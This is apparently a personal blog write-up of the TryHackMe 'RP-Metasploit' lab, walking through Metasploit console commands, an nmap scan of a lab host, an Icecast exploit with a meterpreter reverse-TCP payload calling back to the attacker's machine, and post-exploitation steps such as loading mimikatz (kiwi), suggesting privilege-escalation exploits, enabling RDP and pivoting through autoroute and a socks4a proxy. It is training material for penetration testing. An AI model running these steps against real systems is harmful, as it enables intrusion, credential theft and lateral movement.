---
layout: post
title: TryHackMe - RP-Metasploit
---
```
## Initializing...
Initialize the database with: 
$ msfdb init
```
We can view some of the advanced options we can trigger for starting the console using the command: 

>```$ msfconsole -h```

Quiet start

>```$ msfconsole -q```

Check that we've connected to the database

>```> db_status```

msf5 uses postgresql.

## Rock 'em to the Core [commands]
```
> help
OR
> ?
```
Base command for searching

>```> search```

Select module as active

>```> use```

View information about either a specific module or just the active one we have selected

>```> info```

Built-in netcat-like function where we can make a quick connection with a host simply to verify that we can 'talk' to it

>```> connect```

Change the value of a variable

>```> set```

Change the value of a variable globally

>```> setg```

View the value of a variable

>```> get```

View the value of a global variable

>```> getg```

Change the value of a variable to null/no value

>```> unset```

Set our console output to save to a file

>```> spool```

Use to store the settings/active datastores from Metasploit to a settings file; this will save within your msf4 (or msf5) directory and can be undone easily by simply removing the created settings file. 

>```> save```

## Modules for Every Occasion!
Exploit module holds all of the exploit code we will use
Payload module contains the various bits of shellcode we send to have executed following exploitation
Auxilliary module is most commonly used in scanning and verification machines are exploitable
Post module provides looting and pivoting capabilities
Encoder module allows us to modify the 'appearance' of our exploit such that we may avoid signature detection (commonly utilized in payload obfuscation)
NOP module is used with buffer overflow and ROP attacks

Not every module is loaded in by default, what command can we use to load different modules?

>```> load```


## Move that shell!

Metasploit comes with a built-in way to run nmap and feed it's results directly into our database. Let's run that now by using the command 'db_nmap -sV <BOX-IP>' 

>```> db_nmap -sV 10.10.42.242```

```
> hosts
Hosts
=====

address       mac  name  os_name  os_flavor  os_sp  purpose  info  comments
-------       ---  ----  -------  ---------  -----  -------  ----  --------
10.10.42.242             Unknown                    device         

> services
Services
========

host          port   proto  name          state  info
----          ----   -----  ----          -----  ----
10.10.42.242  135    tcp    msrpc         open   Microsoft Windows RPC
10.10.42.242  139    tcp    netbios-ssn   open   Microsoft Windows netbios-ssn
10.10.42.242  445    tcp    microsoft-ds  open   Microsoft Windows 7 - 10 microsoft-ds workgroup: WORKGROUP
10.10.42.242  3389   tcp    tcpwrapped    open   
10.10.42.242  5357   tcp    http          open   Microsoft HTTPAPI httpd 2.0 SSDP/UPnP
10.10.42.242  8000   tcp    http          open   Icecast streaming media server
10.10.42.242  49152  tcp    msrpc         open   Microsoft Windows RPC
10.10.42.242  49153  tcp    msrpc         open   Microsoft Windows RPC
10.10.42.242  49154  tcp    msrpc         open   Microsoft Windows RPC
10.10.42.242  49155  tcp    msrpc         open   Microsoft Windows RPC
10.10.42.242  49159  tcp    msrpc         open   Microsoft Windows RPC
```
List discovered vulnerabilities

```> vulns```

```
> use icecase
Matching Modules
================

   #  Name                                 Disclosure Date  Rank   Check  Description
   -  ----                                 ---------------  ----   -----  -----------
   0  exploit/windows/http/icecast_header  2004-09-28       great  No     Icecast Header Overwrite


[*] Using exploit/windows/http/icecast_header

msf5 exploit(windows/http/icecast_header) > search multi/handler
Matching Modules
================

   #  Name                                                 Disclosure Date  Rank       Check  Description
   -  ----                                                 ---------------  ----       -----  -----------
   0  auxiliary/scanner/http/apache_mod_cgi_bash_env       2014-09-24       normal     Yes    Apache mod_cgi Bash Environment Variable Injection (Shellshock) Scanner
   1  exploit/android/local/janus                          2017-07-31       manual     Yes    Android Janus APK Signature bypass
   2  exploit/linux/local/apt_package_manager_persistence  1999-03-09       excellent  No     APT Package Manager Persistence
   3  exploit/linux/local/bash_profile_persistence         1989-06-08       normal     No     Bash Profile Persistence
   4  exploit/linux/local/desktop_privilege_escalation     2014-08-07       excellent  Yes    Desktop Linux Password Stealer and Privilege Escalation
   5  exploit/linux/local/yum_package_manager_persistence  2003-12-17       excellent  No     Yum Package Manager Persistence
   6  exploit/multi/handler                                                 manual     No     Generic Payload Handler
   7  exploit/windows/browser/persits_xupload_traversal    2009-09-29       excellent  No     Persits XUpload ActiveX MakeHttpRequest Directory Traversal
   8  exploit/windows/mssql/mssql_linkcrawler              2000-01-01       great      No     Microsoft SQL Server Database Link Crawling Command Execution

> use 7 # number from previous search
> set PAYLOAD windows/meterpreter/reverse_tcp

> run -j # or exploit

> sessions
Active sessions
===============

  Id  Name  Type                     Information             Connection
  --  ----  ----                     -----------             ----------
  1         meterpreter x86/windows  Dark-PC\Dark @ DARK-PC  10.8.20.232:4444 -> 10.10.182.112:49172 (10.10.182.112)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


> sessions -i 1
```

## We're in, now what?

### What command do we use to transfer ourselves into the process? This won't work at the current time as we don't have sufficient privileges but we can still try!
>migrate

### What command can we run to find out more information regarding the current user running the process we are in?
>getuid

### How about finding more information out about the system itself?
>sysinfo

### How do you load mimikatz?
>load kiwi

### Find current user priviledges
>getprivs

### What command do we run to transfer files to our victim computer? 
>upload

### How about if we want to run a Metasploit module?
>run

### What command do we run to figure out the networking information and interfaces on our victim?
>ipconfig

Let's run the command `run post/windows/gather/checkvm`. This will determine if we're in a VM, a very useful piece of knowledge for further pivoting.
Next, let's try: `run post/multi/recon/local_exploit_suggester`. This will check for various exploits which we can run within our session to elevate our privileges. 
Finally, let's try forcing RDP to be available. This won't work since we aren't administrators, however, this is a fun command to know about: `run post/windows/manage/enable_rdp`

### What command can we run in our meterpreter session to spawn a normal system shell? 
>shell

## Makin' Cisco
Let's go ahead and run the command `run autoroute -h`, this will pull up the help menu for autoroute. What command do we run to add a route to the following subnet: 172.18.1.0/24? Use the -n flag in your answer.
>run autoroute -s 172.18.1.0 -n 255.255.255.0

Additionally, we can start a socks4a proxy server out of this session. Background our current meterpreter session and run the command `search server/socks4a`. What is the full path to the socks4a auxiliary module?

>auxiliary/server/socks4a

Once we've started a socks server we can modify our /etc/proxychains.conf file to include our new server. What command do we prefix our commands (outside of Metasploit) to run them through our socks4a server with proxychains?

>proxychains